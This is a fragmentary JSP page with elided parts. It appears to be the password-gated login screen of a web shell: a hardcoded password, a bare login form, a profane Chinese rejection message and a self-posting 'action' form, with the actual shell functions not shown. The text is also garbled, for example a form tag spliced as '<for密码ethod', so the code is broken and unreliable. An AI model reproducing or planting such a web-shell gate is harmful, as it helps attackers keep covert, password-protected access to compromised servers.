...
<%!
//it's explame
private String _password = "940916";
...
<form name="f1" method="get">
  <tr>
    <td align="center" colspan="2"><b> 》zgsdzczh《 </b></td>
  </tr>
  <tr>
    <td>密码:</td>
    <td>
		<input type="password" size="25" name="password" class="textbox" />
		<input type="submit" value="进入" class="button" />
    </td>
  </tr>
</form>
</table>
...
// end of the login form
	...
	if (session.getAttribute("password") == null) {
		...
		if (validate(password) == false) {
			out.println("<div align=\"center\"><font color=\"red\"><li>操，你哪位!</font></div>");
			out.close();
			return;
		}
...
<table align="center" width="600" border="0" cellpadding="2" cellspacing="1" bgcolor="#CCCCCC">
	<for密码ethod="post" name="form2" action="<%= request.getRequestURI() + "?action=" + action%>">
	<tr bgcolor="#FFFFFF">
